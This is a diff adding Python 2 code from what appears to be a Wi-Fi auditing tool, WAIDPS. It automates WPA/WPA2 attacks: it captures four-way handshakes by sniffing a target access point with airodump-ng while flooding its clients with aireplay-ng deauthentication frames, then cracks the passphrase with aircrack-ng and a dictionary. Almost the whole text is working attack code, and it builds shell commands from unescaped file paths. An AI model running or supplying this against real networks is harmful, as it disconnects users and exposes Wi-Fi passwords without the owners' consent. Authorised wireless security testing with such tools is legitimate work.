+                    usr_resp=AskQuestion("Select a dictionary",fcolor.SGreen + "Default Dictionary","", " ","1")
+                    LineBreak()
+                    if usr_resp==" ":
+                        DICTIONARYUSE=__builtin__.SELECTED_DICT
+                    else:
+                        if usr_resp.isdigit()==True:
+                            usr_resp=usr_resp-1
+                            if usr_resp>len(__builtin__.DictionaryList):
+                                printc ("!!!","Invalid option. Default dictionary will be use.","")
+                                DICTIONARYUSE=__builtin__.SELECTED_DICT
+                        else:
+                            if IsFileDirExist(usr_resp)=="F":
+                                DICTIONARYUSE=usr_resp
+                            else:
+                                printc ("!!!","Dictionary Not Found. Default dictionary will be use.","")
+                                DICTIONARYUSE=__builtin__.SELECTED_DICT
+                printc ("i",fcolor.BPink + "Dictionary Used : " + fcolor.BWhite + str(DICTIONARYUSE) + "","")
+                tmpstatus=tmpdir + "CRACKING.txt"
+                __builtin__.WPAKeyFile=tmpdir + "WPA_CRACKED.txt"
+                DelFile(tmpstatus,"")
+                DelFile(__builtin__.WPAKeyFile,"")
+                KillAllMonitor()
+                cmd="aircrack-ng -w " + str(DICTIONARYUSE) + " -l " + str(__builtin__.WPAKeyFile) + " \x22" + str(fileuse) + "\x22 > " + str(tmpstatus)
+                cmdLine="xterm -geometry 100x5-0-150 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Cracking WPA Key' -e '" + str(cmd) + "'"
+                ps=subprocess.Popen(cmdLine , shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'),preexec_fn=os.setsid)
+                __builtin__.TStart=Now()
+                print ""
+                while WPA_CRACKED=="":
+                    while sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
+                        usr_resp = sys.stdin.readline()
+                        if usr_resp:
+                            print ""
+                            LineBreak()
+                            printc ("i",fcolor.BBlue + "Auditing Menu [WPA]","")
+                            DisplayAPDetail()
+                            MSG=""
+                            MSG=MSG + tabspacefull + fcolor.BRed + "1 " + fcolor.SWhite + " - Stop Auditing\n"
+                            MSG=MSG + tabspacefull +fcolor.BRed + "2 " + fcolor.SWhite + " - Change Dictionary\n" 
+                            MSG=MSG + tabspacefull +fcolor.BRed + "0" + fcolor.SWhite + " - Return"
+                            print MSG
+                            usr_resp=AskQuestion("Select an option",fcolor.BRed + "0" + fcolor.BYellow + " - Return","U"," ","1")
+                            print ""
+                            if usr_resp!="0":
+                                print ""
+                                if usr_resp=="1":
+                                    LineBreak()
+                                    DisplayComplete(__builtin__.TStart)
+                                    ShutDownAuditingWindows()
+                                    print "";printc ("x","","")
+                                    OptAuditing("")
+                                    return;
+                            elif usr_resp=="2":
+                                LineBreak()
+                                DeauthBroadcast(__builtin__.ATTACK_AP_BSSID,__builtin__.SELECTED_MON,5)
+                            else:
+                                retkey=""
+                    if IsFileDirExist(tmpstatus)=="F":
+                        Result=""
+                        timelapse="";keytested="";rate="";curpassphase="";
+                        with open(tmpstatus,"r") as f:
+                            for line in f:
+                                sline=str(line).replace("\n","").lstrip().rstrip()
+                                if str(sline).find("keys tested")!=-1:
+                                    crackstarted="1"
+                                    sline=str(sline).replace("(","").replace(")","")
+                                    tmps=[]
+                                    tmps=str(sline).split(" ")
+                                    if len(tmps)>4:
+                                        timelapse=str(tmps[0]).replace("[","").replace("]","")[-8:]
+                                        keytested=str(tmps[1])
+                                        rate=str(tmps[4])
+                                if str(sline).find("Current passphrase: ")!=-1:
+                                    PS1=sline.index("Current passphrase: ")
+                                    PS1=PS1+20
+                                    PS2=len(sline)
+                                    curpassphase=sline[PS1:PS2]
+                                if str(sline).find("Passphrase not in dictionary")!=-1:
+                                    printl (tabspacefull + fcolor.SWhite + Now() + " - " + fcolor.SBlack + str(timelapse) + fcolor.BRed + "  Cracking Failed... Passphase not found in dictionary !!!" ,"0","")
+                                    print ""
+                                    WPA_CRACKED="2"
+                                if len(sline)>0:
+                                    Result=Result + sline +"\n"
+                        if str(curpassphase)!="" and WPA_CRACKED!="2":
+                            printl (tabspacefull + fcolor.SWhite + Now() + " - " + fcolor.SBlack + str(timelapse) + fcolor.SGreen + " Cracking WPA Passphase - " + fcolor.BGreen + str(keytested) + fcolor.SGreen + " keys tested [Rate " + fcolor.BGreen + str(rate) + fcolor.SGreen + " k/sec], Current Passphase : [ " + fcolor.BWhite + str(curpassphase) + fcolor.SGreen + " ]" ,"0","")
+                        if str(Result)=="":
+                            blankct=blankct+1
+                            if blankct==10:
+                                if crackstarted=="1":
+                                    printl (tabspacefull + fcolor.SWhite + Now() + " - " + fcolor.SBlack + str(timelapse) + fcolor.BRed + "  Cracking Failed... Passphase not found in dictionary !!!" ,"0","")
+                                else:
+                                    printl (tabspacefull + fcolor.SWhite + Now() + " - " + fcolor.SBlack + str(timelapse) + fcolor.BRed + "  Cracking Failed... Aircrack-NG failed to read packets !!!" ,"0","")
+                                print ""
+                                WPA_CRACKED="2"
+                        else:
+                            blankct=0
+                        if Result!="":
+                            open(tmpstatus,"w").write("")
+                    if IsFileDirExist(__builtin__.WPAKeyFile)=="F":
+                         WPA_KEY=""
+                         with open(__builtin__.WPAKeyFile,"r") as f:
+                             for line in f:
+                                 sline=str(line).replace("\n","")
+                                 if len(sline)>0:
+                                     WPA_KEY=WPA_KEY + sline +"\n"
+                         WPA_KEY=str(WPA_KEY).replace("\n","")
+                         if str(WPA_KEY)!="":
+                             WPA_CRACKED="1"
+                    time.sleep(1)
+            else:
+                print fcolor.BRed + tabspacefull + str(msg) + " !!!"
+                if Auto=="":
+                    printc ("x","","")
+                    LineBreak()
+                CrackWPAKey(HS_File,Auto)
+                return
+    ShutDownAuditingWindows()
+    if WPA_CRACKED=="1" and IsFileDirExist(str(__builtin__.WPAKeyFile))=="F":
+        DelFile(__builtin__.WPAKeyFile,"")
+        print ""
+        printc (" ",fcolor.SGreen + "Dictionary use : " + fcolor.SWhite + str(DICTIONARYUSE),"")
+        print"";print ""
+        printc ("i",fcolor.SWhite + Now() + " - " + fcolor.BBlue + "WPA Passphase for Access Point [ " + fcolor.BYellow +str(FBSSID) + fcolor.BBlue + " ], ESSID [ " + fcolor.BPink + str(FESSID) + fcolor.BBlue + " ] successfully cracked.. ","")
+        printc (" ","\t\t\t  - " + fcolor.BBlue + "WPA Passphase Found [ " + fcolor.BRed +str(WPA_KEY) + fcolor.BBlue + " ]","")
+        print ""
+        AddCrackDB(FBSSID,EncType,WPA_KEY,FESSID,fileuse,"")
+    if WPA_CRACKED!="":
+        if DICTIONARYUSE!="":
+            printc (" ",fcolor.SGreen + "Dictionary use : " + fcolor.SWhite + str(DICTIONARYUSE),"")
+        LineBreak()
+        DisplayComplete(__builtin__.TStart)
+        if Auto=="":
+            printc ("x","","")
+            LineBreak()
+        return
+    LineBreak()
+    printc ("x","","")
+    OptAuditing("")
+    return
+
+def AttackWPAProc(TargetMAC,TargetChannel,ClentList,Auto):
+    __builtin__.ATTACK_AP_PDATA=""
+    __builtin__.ATTACK_AP_PBEACON=""
+    __builtin__.DB_HSSAVED="0"
+    __builtin__.HandshakeSaved_Aircrack=""
+    TargetMAC2=str(TargetMAC).replace(":","")
+    if Auto=="":
+        printc ("i",fcolor.BBlue + "WPA Handshake Capturing","")
+        printc (" ",fcolor.SWhite + "Application will send broadcast deauthentication signal to all clients connected to the selected access point and also send targeted deauthentication signal between client and access point if any clients were found connected to the access point.\n","")
+    HS_File=savedir + "Handshake_" + TargetMAC2 + "*.cap"
+    FFILE=[]
+    FFILE=glob.glob(HS_File)
+    if len(FFILE)>0:
+        HS_File2=FFILE[0]
+        if Auto=="":
+            print ""
+            printc ("i",fcolor.BGreen + "Total [ " + fcolor.BRed + str(len(FFILE)) + fcolor.BGreen + " ] handshake files found !!","")
+            printc (" ", fcolor.BRed + "1" + fcolor.SWhite + " - Crack existing capture " + fcolor.SGreen + str(HS_File),"")
+            printc (" ", fcolor.BRed + "2" + fcolor.SWhite + " - Capture new handshake","")
+            printc (" ", fcolor.BRed + "3" + fcolor.SWhite + " - List existing handshake files","")
+            printc (" ", fcolor.BRed + "4" + fcolor.SWhite + " - Abort","")
+            Qus=fcolor.BPink + "Enter your option"
+            usr_resp=AskQuestion(Qus,"1/2/3/4 " + fcolor.SWhite + "Default-1","U","1","1")
+            LineBreak()
+            if usr_resp=="2":
+                CaptureNew=1
+            elif usr_resp=="3":
+                DisplayCapturedFile(HS_File)
+                AttackWPAProc(TargetMAC,TargetChannel,ClentList,"")
+                return
+            elif usr_resp=="4":
+                OptAuditing("")
+                return
+            else:
+                CrackWPAKey(HS_File,"")
+                return
+        else:
+            CaptureNew=1
+    if Auto=="":
+        if len(__builtin__.CUR_CLIENT)>0:
+            usr_resp=AskQuestion(fcolor.BGreen + "Previous scan found [ " + fcolor.BRed + str(len(__builtin__.CUR_CLIENT)) + fcolor.BGreen + " ] client, Rescan for client ?","Y/n","U","Y","1")
+            if usr_resp!="Y":
+                __builtin__.CUR_CLIENT=[]
+        __builtin__.TStart=Now()
+        print "\n"
+        printc ("i",fcolor.BGreen + "Time Start : " + fcolor.SWhite + str(__builtin__.TStart),"")
+    else:
+        __builtin__.CUR_CLIENT=[]
+    FName=tmpdir + "WPA_" + str(TargetMAC).replace(":","") + "_TMP"
+    DelFile(FName + "*.*","")
+    print ""
+    printc (".",fcolor.SWhite + Now() + " - " + fcolor.SGreen + "Starting Sniffer for Access Point [ " + fcolor.SYellow +str(TargetMAC) + fcolor.SGreen + " ]..","")
+    cmdLine="xterm -geometry 100x20-0-200 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Sniffing Packet' -e 'airodump-ng --bssid " + TargetMAC  + " -c" + str(TargetChannel) + " -w " + FName + " " + str(__builtin__.SELECTED_ATK) + " | tee " + tmpdir + "SNIF_RESULT.txt" + "'"
+    ps=subprocess.Popen(cmdLine , shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'),preexec_fn=os.setsid)		
+    __builtin__.Sniffer=ps.pid
+    WPA_HANDSHAKE=""
+    NEWCLIENT=[]
+    DAUTHCT=0
+    CHECKFS=""
+    __builtin__.CapFile=FName + "-01.cap"
+    while WPA_HANDSHAKE=="":
+        os.system('clear')
+        CenterText(fcolor.BWhite + fcolor.BGRed, "AUDITING WPA/WPA2 NETWORK")
+        print ""
+        DisplayAPDetail()
+        ClientA=len(__builtin__.CUR_CLIENT)
+        if ClientA==0:
+            printc ("!!!","NO CLIENT AVAILABLE FOR DEAUTHENTICATION, HANDSHAKE CAPTURING IS NOT AVAILABLE.","")
+        if str(__builtin__.CapFileSize)!="" and int(__builtin__.CapFileSize)>3000000 and __builtin__.DB_HSSAVED=="0":
+            printc ("!!!","Captured Packets filesize is getting big but still without any valid handshake. Restarting.... ","")
+            KillSubProc(__builtin__.Sniffer)
+            DelFile(FName + "*.*","")
+            Search="WAIDPS - Sniffing"
+            KillProc(Search)
+            AttackWPAProc(TargetMAC,TargetChannel,ClentList,"1")
+            return
+        t=0
+        retkey=""
+        if CHECKFS=="":
+            print ""
+            FS=0
+            NW=Now()
+            while FS<240:
+                if IsFileDirExist(FName + "-01.csv")=="F": 
+                    statinfo = os.stat(FName + "-01.csv")
+                    FS=statinfo.st_size
+                else:
+                    FS=0
+                PrintText=fcolor.BBlue + str(NW) + " - " +  "Locating Access Point [ " + fcolor.BYellow + __builtin__.ATTACK_AP_BSSID + fcolor.BBlue + " ] on Channel " + fcolor.BYellow + __builtin__.ATTACK_AP_CH + fcolor.BBlue + ", Please wait...."
+                bcolor=fcolor.SWhite
+                pcolor=fcolor.BGreen
+                tcolor=fcolor.SGreen
+                s=bcolor + "[" + pcolor + str(t) + bcolor + "]" + __builtin__.tabspace + tcolor + PrintText + "\r"
+                sl=len(s)-3
+                print s,
+                sys.stdout.flush()
+                time.sleep(1)
+                t=t+1
+                s=""
+                ss="\r"
+                print "" + s.ljust(sl) + ss,
+                sys.stdout.flush()
+                if t>25:
+                    usr_resp=AskQuestion(fcolor.BGreen + "Access point still not located, continue ?" + fcolor.BGreen,"y/N","U","N","1")
+                    if usr_resp=="Y":
+                        NW=Now()
+                        t=1
+                    else:
+                        LineBreak()
+                        KillSubProc(__builtin__.Sniffer)
+                        DelFile(FName + "*.*","")
+                        OptAuditing("")
+                        return;
+            CHECKFS=statinfo.st_size
+        
+        DAUTHCT=int(DAUTHCT)+1
+        if DAUTHCT>5:
+            DAUTHCT=1
+        NORESULT="1";TCL_ACK=0;TAP_ACK=0
+        if __builtin__.WPA_AUTOCLIENT=="ON":
+            printc (".",fcolor.SWhite + Now() + " - " + fcolor.BRed + "Broadcasting Deauthentication Signal To All Clients..." + fcolor.SGreen + " (x" + str(DAUTHCT) + ") ","")
+            cmd = [ "aireplay-ng","-0", str(DAUTHCT),"-a", str(__builtin__.ATTACK_AP_BSSID), str(__builtin__.SELECTED_ATK)]
+            ps = Popen(cmd, stdout=PIPE, stderr=open(os.devnull))
+            ps.wait()
+            if len(ClentList)>0:
+                x=0
+                while x<len(ClentList):
+                    CLIENTMAC=ClentList[x]
+                    print ""
+                    printc (".",fcolor.SWhite + Now() + " - " + fcolor.BRed + "Sending Deauthentication Signal To Client : " + fcolor.BYellow + CLIENTMAC + fcolor.SGreen + " (x" + str(DAUTHCT) + ") ","")
+                    printc (" ","First Seen  : " + fcolor.SWhite + str(__builtin__.CUR_CLIENT_FS[x]).lstrip() + fcolor.SGreen + "\t  Last Seen : " + fcolor.SWhite + str(__builtin__.CUR_CLIENT_LS[x]).lstrip() + fcolor.SGreen + "\tPower : " + fcolor.SWhite + str(__builtin__.CUR_CLIENT_PWR[x]).lstrip() + " dBm"+ fcolor.SGreen + "    \tFrames : " + fcolor.SWhite + str(__builtin__.CUR_CLIENT_DATA[x]).lstrip() + "","")
+                    CLIENTOUI=str(DisplayOUIDetail(CLIENTMAC,fcolor.BYellow)).replace("\n","")
+                    CLIENTOUI="    " + str(CLIENTOUI).replace("MAC Addr",fcolor.SGreen + "MAC Addr   ").replace("]",fcolor.SGreen + "]").replace("] ]",fcolor.SCyan + "]" + fcolor.SGreen + " ]")
+                    print CLIENTOUI
+                    cmd = [ "aireplay-ng","-0", str(DAUTHCT),"-a", str(__builtin__.ATTACK_AP_BSSID),"-c", str(CLIENTMAC), str(__builtin__.SELECTED_ATK)]
+                    ps = Popen(cmd, stdout=PIPE, stderr=open(os.devnull))
+                    lines=ps.communicate()
+                    lines=str(lines).replace("\\r\\n","\t")
+                    lines=str(lines).split("\t")
+                    lines=RearrangeReturn(lines)
+                    for line in lines:
+                        line=str(line).replace("\n","").replace("\r","")
+                        if line!="":
+                            lina=str(line).replace("\x00","").replace("[","").replace("]","").replace("|"," ").replace("  "," ").replace(" ",",")
+                            lina=lina+",,,,,,,,,"
+                            LSPLIT=str(lina).split(",")
+                            if len(LSPLIT)>9:
+                                if LSPLIT[5]=="STMAC:" and len(LSPLIT[6])==17 and LSPLIT[9]=="ACKs":
+                                     T_PKTS=int(LSPLIT[2])*2
+                                     CL_ACK=LSPLIT[7]
+                                     TCL_ACK=TCL_ACK + int(CL_ACK)
+                                     if int(CL_ACK)==0:
+                                         CL_ACK=fcolor.BRed + str(CL_ACK)
+                                     AP_ACK=LSPLIT[8]
+                                     TAP_ACK=TAP_ACK+int(AP_ACK)
+                                     if int(AP_ACK)==0:
+                                         AP_ACK=fcolor.BRed + str(AP_ACK)
+                                     printc (" ",fcolor.SGreen + "Packet Sent : " + fcolor.BGreen + str(T_PKTS) + fcolor.SGreen + "\t\tAccess Point [ " + fcolor.SWhite + __builtin__.ATTACK_AP_BSSID + fcolor.SGreen + " ] ACKs : " + fcolor.BGreen + str(AP_ACK) + fcolor.SGreen + "\tClient [ " + fcolor.SWhite + CLIENTMAC + fcolor.SGreen + " ] ACKs : " + fcolor.BGreen + str(CL_ACK),"")
+                                     NORESULT=""
+                    x += 1
+        else:
+            if str(__builtin__.WPA_DEAUTH_MAC)!="":
+                print ""
+                CLIENTMAC=__builtin__.WPA_DEAUTH_MAC
+                printc (".",fcolor.SWhite + Now() + " - " + fcolor.BRed + "Sending Deauthentication Signal To Selected Client : " + fcolor.BYellow + CLIENTMAC + fcolor.SGreen + " (x" + str(DAUTHCT) + ") ","")
+                printc (" ","First Seen  : " + fcolor.SWhite + str(__builtin__.SCUR_CLIENT_FS).lstrip() + fcolor.SGreen + "\t  Last Seen : " + fcolor.SWhite + str(__builtin__.SCUR_CLIENT_LS).lstrip() + fcolor.SGreen + "\tPower : " + fcolor.SWhite + str(__builtin__.SCUR_CLIENT_PWR).lstrip() + " dBm"+ fcolor.SGreen + "    \tFrames : " + fcolor.SWhite + str(__builtin__.SCUR_CLIENT_DATA).lstrip() + "","")
+                CLIENTOUI=str(DisplayOUIDetail(CLIENTMAC,fcolor.BYellow)).replace("\n","")
+                CLIENTOUI="    " + str(CLIENTOUI).replace("MAC Addr",fcolor.SGreen + "MAC Addr   ").replace("]",fcolor.SGreen + "]").replace("] ]",fcolor.SCyan + "]" + fcolor.SGreen + " ]")
+                print CLIENTOUI
+                cmd = [ "aireplay-ng","-0", str(DAUTHCT),"-a", str(__builtin__.ATTACK_AP_BSSID),"-c", str(CLIENTMAC), str(__builtin__.SELECTED_ATK)]
+                ps = Popen(cmd, stdout=PIPE, stderr=open(os.devnull))
+                lines=ps.communicate()
+                lines=str(lines).replace("\\r\\n","\t")
+                lines=str(lines).split("\t")
+                lines=RearrangeReturn(lines)
+                for line in lines:
+                    line=str(line).replace("\n","").replace("\r","")
+                    if line!="":
+                        lina=str(line).replace("\x00","").replace("[","").replace("]","").replace("|"," ").replace("  "," ").replace(" ",",")
+                        lina=lina+",,,,,,,,,"
+                        LSPLIT=str(lina).split(",")
+                        if len(LSPLIT)>9:
+                            if LSPLIT[5]=="STMAC:" and len(LSPLIT[6])==17 and LSPLIT[9]=="ACKs":
+                                T_PKTS=int(LSPLIT[2])*2
+                                CL_ACK=LSPLIT[7]
+                                TCL_ACK=TCL_ACK + int(CL_ACK)
+                                if int(CL_ACK)==0:
+                                    CL_ACK=fcolor.BRed + str(CL_ACK)
+                                AP_ACK=LSPLIT[8]
+                                TAP_ACK=TAP_ACK+int(AP_ACK)
+                                if int(AP_ACK)==0:
+                                    AP_ACK=fcolor.BRed + str(AP_ACK)
+                                printc (" ",fcolor.SGreen + "Packet Sent : " + fcolor.BGreen + str(T_PKTS) + fcolor.SGreen + "\t\tAccess Point [ " + fcolor.SWhite + __builtin__.ATTACK_AP_BSSID + fcolor.SGreen + " ] ACKs : " + fcolor.BGreen + str(AP_ACK) + fcolor.SGreen + "\tClient [ " + fcolor.SWhite + CLIENTMAC + fcolor.SGreen + " ] ACKs : " + fcolor.BGreen + str(CL_ACK),"")
+                                NORESULT=""
+        if NORESULT=="1":
+            printc ("!",fcolor.SRed + "No Result !!","")
+        else:
+            MSG=""
+            if int(TCL_ACK)==0:
+                MSG=MSG + "No acknowledgement received from Client"
+            if int(TAP_ACK)==0:
+                if MSG=="":
+                    MSG="No acknowledgement received from Access Point"
+                else:
+                    MSG="No acknowledgement received from Access Point and Client"
+            if MSG!="":
+                printc (" ",fcolor.SRed + MSG,"")
+        WPA_HANDSHAKE=CheckHandshake(__builtin__.CapFile,__builtin__.ATTACK_AP_BSSID,__builtin__.ATTACK_AP_ESSID)
+        if WPA_HANDSHAKE=="1":
+            x=len(ClentList)
+        else:
+            while sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
+                usr_resp = sys.stdin.readline()
+                if usr_resp:
+                    x=len(ClentList)
+                    retkey="1"
+        if WPA_HANDSHAKE=="":
+            if retkey=="":
+                retkey=WaitProcessing(10,1)
+            while retkey!="":
+                LineBreak()
+                printc ("i",fcolor.BBlue + "Auditing Menu [WPA Handshake]","")
+                MSG=""
+                DisplayAPDetail()
+                DAMAC=""
+                if str(__builtin__.WPA_DEAUTH_MAC)!="":
+                    DAMAC=fcolor.SWhite + "  Deauth MAC : " + fcolor.BRed +  str(__builtin__.WPA_DEAUTH_MAC)
+                MSG=MSG + tabspacefull + fcolor.BRed + "1" + fcolor.SWhite + " - Stop Auditing\n"
+                MSG=MSG + tabspacefull + fcolor.BRed + "2" + fcolor.SWhite + " - Deauth All\n"
+                MSG=MSG + tabspacefull + fcolor.BRed + "3" + fcolor.SWhite + " - List clients\n"
+                MSG=MSG + tabspacefull + fcolor.BRed + "4" + fcolor.SWhite + " - View Handshake Captured\n"
+                MSG=MSG + tabspacefull + fcolor.BRed + "5" + fcolor.SWhite + " - Automatically Deauth Found Client " + fcolor.SGreen + " - " + str(__builtin__.WPA_AUTOCLIENT) + str(DAMAC) + "\n"
+                MSG=MSG + tabspacefull + fcolor.BRed + "9" + fcolor.SWhite + " - Restart Monitoring\n"
+                MSG=MSG + tabspacefull + fcolor.BRed + "0" + fcolor.SWhite + " - Return\n"
+                print MSG
+                usr_resp=AskQuestion("Select an option",fcolor.BRed + "0" + fcolor.BYellow + " - Return","U"," ","1")
+                if usr_resp!="0":
+                    print ""
+                    if usr_resp=="1":
+                        LineBreak()
+                        DisplayComplete(__builtin__.TStart)
+                        KillSubProc(__builtin__.Sniffer)
+                        DelFile(FName + "*.*","")
+                        print "";printc ("x","","")
+                        OptAuditing("")
+                        return;
+                    elif usr_resp=="2":
+                        LineBreak()
+                        printc (".",fcolor.BRed + "Broadcasting Deauthentication Signal To All Clients..." + fcolor.SGreen + " (x" + str(DAUTHCT) + ") ","")
+                        cmd = [ "aireplay-ng","-0", str(DAUTHCT),"-a", str(__builtin__.ATTACK_AP_BSSID), str(__builtin__.SELECTED_ATK)]
+                        ps = Popen(cmd, stdout=PIPE, stderr=open(os.devnull))
+                        ps.wait()
+                    elif usr_resp=="3":
+                        if len(__builtin__.CUR_CLIENT)>0:
+                            ListClientFound()
+                        else:
+                            printc ("!",fcolor.SRed + "No client found !!","")
+                    elif usr_resp=="9":
+                        printc ("i",fcolor.BGreen + "Restarting capturing process .....","")
+                        KillSubProc(__builtin__.Sniffer)
+                        DelFile(FName + "*.*","")
+                        Search="WAIDPS - Sniffing"
+                        KillProc(Search)
+                        __builtin__.HS_File="";__builtin__.HS_FileFull="";__builtin__.HS_FileStrict="";__builtin__.HS_FileStrictFull=""
+                        AttackWPAProc(TargetMAC,TargetChannel,ClentList,"1")
+                        return
+                    elif usr_resp=="5":
+                        LineBreak()
+                        if len(__builtin__.CUR_CLIENT)>0:
+                            ListClientFound()
+                        if str(__builtin__.WPA_DEAUTH_MAC)!="":
+                            printc ("i",fcolor.BGreen + "Current Deauth Client MAC : " + fcolor.BRed + str(__builtin__.WPA_DEAUTH_MAC),"")
+                        MAC=str(AskQuestion("Enter the Client MAC to Deauth xx:xx:xx:xx:xx:xx :",fcolor.SGreen + "Default - Remove MAC ","U","NIL","")).lstrip().rstrip()
+                        if MAC!="" and MAC!="NIL":
+                            if MAC.isdigit()==True:
+                                if int(MAC.isdigit())-1<int(len(__builtin__.CUR_CLIENT)):
+                                    MAC=__builtin__.CUR_CLIENT[int(MAC)-1]
+                                    printc (" ",fcolor.SWhite + " Selected ==> " + fcolor.BYellow + str(MAC),"")
+                            if len(MAC)!=17 or IsHex(MAC)==False:
+                                printc ("!!!","Invalid MAC Address Entered !","")
+                                print ""
+                            elif MAC!="NIL": 
+                                __builtin__.WPA_DEAUTH_MAC=MAC
+                                __builtin__.WPA_AUTOCLIENT="OFF"
+                                mi=FindMACIndex(MAC,__builtin__.CUR_CLIENT_FS)
+                                __builtin__.SCUR_CLIENT_FS=__builtin__.CUR_CLIENT_FS[mi]
+                                __builtin__.SCUR_CLIENT_LS=__builtin__.CUR_CLIENT_LS[mi]
+                                __builtin__.SCUR_CLIENT_PWR=__builtin__.CUR_CLIENT_PWR[mi]
+                                __builtin__.SCUR_CLIENT_DATA=__builtin__.CUR_CLIENT_DATA[mi]
+                                __builtin__.SCUR_CLIENT_PROBE=__builtin__.CUR_CLIENT_PROBE[mi]
+                                print ""
+                                printc ("i",fcolor.BPink + "Selected Client MAC Address To Deauth : " + fcolor.BRed + str(MAC),"")
+                                printc (" ",fcolor.SWhite + "Please note that application will only send deauthentication signal to access point and station MAC address.","")
+                                printc (" ",fcolor.SWhite + "Broadcast deauthentication to all stations will be disabled..\n","")
+                            else:
+                                __builtin__.WPA_AUTOCLIENT="ON"
+                                __builtin__.WPA_DEAUTH_MAC=""
+                    elif usr_resp=="4":
+                        ManualCheckHandShake(__builtin__.CapFile)
+                    else:
+                        LineBreak()
+                else:
+                    retkey=""
+            LineBreak()
+            NEWCLIENT=GetClientFromCSV (FName + "-01.csv")
+            if len(NEWCLIENT)>0:
+                __builtin__.CUR_CLIENT=__builtin__.NEW_CLIENT
+                ClentList=__builtin__.NEW_CLIENT
+                __builtin__.CUR_CLIENT_FS=__builtin__.NEW_CLIENT_FS
+                __builtin__.CUR_CLIENT_LS=__builtin__.NEW_CLIENT_LS
+                __builtin__.CUR_CLIENT_PWR=__builtin__.NEW_CLIENT_PWR
+                __builtin__.CUR_CLIENT_DATA=__builtin__.NEW_CLIENT_DATA
+                __builtin__.CUR_CLIENT_PROBE=__builtin__.NEW_CLIENT_PROBE
+         
+    print ""
+    DisplayComplete(__builtin__.TStart)
+    KillSubProc(__builtin__.Sniffer)
+    DelFile(FName + "*.*","")
+    LineBreak()
+    if IsFileDirExist(__builtin__.HS_FileStrictFull)=="F":
+        CrackWPAKey(__builtin__.HS_File,"1")
+    printc ("x","","")
+    OptAuditing("")
+ 
+    return
+
+def ManualCheckHandShake(capfile):
+    HANDSHAKE_LIST1=[]
+    HANDSHAKE_LIST1R=[]
+    HANDSHAKE_LIST2=[]
+    HANDSHAKE_LIST2R=[]
+    HANDSHAKE_LIST3=[]
+    HANDSHAKE_LIST3R=[]
+    HANDSHAKE_LIST4=[]
+    HANDSHAKE_LIST4R=[]
+    ARW=" -> "
+    eapol="eapol" # || wlan_mgt.tag.interpretation"
+    cmd = ['tshark','-t','ad','-r',capfile , '-R', eapol, '-n']
+    proc = Popen(cmd, stdout=PIPE, stderr=open(os.devnull))
+    proc.wait()
+    HS1=0;HS2=0;HS3=0;HS4=0;SQL=0;SQL_MATCH="";linelist=[];ARW=" -> "
+    lc=0
+    lines = proc.communicate()[0].split('\n')
+    if len(lines)>1:
+        LineBreak()
+        printc ("i",fcolor.BBlue + "Found Handshake Data","")
+        for line in lines:
+            FRMAC=""
+            TOMAC=""
+            DTYPE=""
+            MSGC=""
+            line=str(line).replace("  "," ").replace("  "," ").replace("  "," ")
+            if line!="":
+                lc=lc+1 
+                spc=""
+                if lc<10:
+                  spc=" "
+                printc (fcolor.SGreen + str(lc),str(spc) + fcolor.SWhite + line,"")
+            linelist=line.split(" ")
+            if len(linelist)>11:
+                FRMAC=str(linelist[3]).upper()
+                TOMAC=str(linelist[5]).upper()
+                DTYPE=str(linelist[6]).upper()
+                MSGC=str(linelist[10]).upper()
+            if DTYPE=="EAPOL" and str(line).find("(Message ")!=-1:
+                M1=0;M2=0;M3=0;M4=0;AM=""
+                if MSGC=="1":
+                    M1=1;AM="1";HS1=int(HS1)+1;SQL=1
+                if MSGC=="2":
+                    M2=1;AM="2";HS2=int(HS2)+1
+                    if SQL==1:
+                        SQL=2
+                if MSGC=="3":
+                    M3=1;AM="3";HS3=int(HS3)+1
+                    if SQL==2:
+                        SQL=3
+                if MSGC=="4":
+                    M4=1;AM="4";HS4=int(HS4)+1
+                    if SQL==3:
+                        SQL=4;SQL_MATCH=1
+                if MSGC=="1" or MSGC=="3":
+                    FRTOMAC=str(FRMAC) + str(ARW) + str(TOMAC) # + "[" + str(AM) + "]"
+                    TOFRMAC=str(TOMAC) + str(ARW) + str(FRMAC)
+                if MSGC=="2" or MSGC=="4":
+                    TOFRMAC=str(FRMAC) + str(ARW) + str(TOMAC) 
+                    FRTOMAC=str(TOMAC) + str(ARW) + str(FRMAC)
+                Result1=Find2MACIndex(FRTOMAC, HANDSHAKE_LIST1)
+                if Result1==-1:
+                    HANDSHAKE_LIST1.append (str(FRTOMAC))
+                    HANDSHAKE_LIST1R.append (str(M1))
+                    HANDSHAKE_LIST3.append (str(FRTOMAC))
+                    HANDSHAKE_LIST3R.append (str(M3))
+                    HANDSHAKE_LIST2.append (str(TOFRMAC))
+                    HANDSHAKE_LIST2R.append (str(M2))
+                    HANDSHAKE_LIST4.append (str(TOFRMAC))
+                    HANDSHAKE_LIST4R.append (str(M4))
+                else:
+                    HANDSHAKE_LIST1R[Result1]=int(HANDSHAKE_LIST1R[Result1]) + int(M1)
+                    HANDSHAKE_LIST2R[Result1]=int(HANDSHAKE_LIST2R[Result1]) + int(M2)
+                    HANDSHAKE_LIST3R[Result1]=int(HANDSHAKE_LIST3R[Result1]) + int(M3)
+                    HANDSHAKE_LIST4R[Result1]=int(HANDSHAKE_LIST4R[Result1]) + int(M4)
+        if len(HANDSHAKE_LIST1)>0:
+            hsc=0;FULL4WAY="";print ""
+            while hsc<len(HANDSHAKE_LIST1):
+                list=[];OUI=""
+                list=str(HANDSHAKE_LIST1[hsc]).split(" ")
+                CLMAC=str(list[2])
+                OUI=Check_OUI(CLMAC,"")
+                DPART1=str(HANDSHAKE_LIST1[hsc]) + " = " +  str(HANDSHAKE_LIST1R[hsc]) + " / " + str(HANDSHAKE_LIST3R[hsc])
+                DPART1=str(DPART1).ljust(50) + " ."
+                DPART1=str(DPART1).replace(str(ARW),fcolor.SRed + str(ARW) + fcolor.SGreen).replace("/",fcolor.SWhite + "/" + fcolor.BWhite).replace("=",fcolor.SWhite + "=" + fcolor.BWhite)
+                DPART2=str(HANDSHAKE_LIST2[hsc]) + " = " +  str(HANDSHAKE_LIST2R[hsc]) + " / " + str(HANDSHAKE_LIST4R[hsc])
+                DPART2=str(DPART2).ljust(50) + " ."
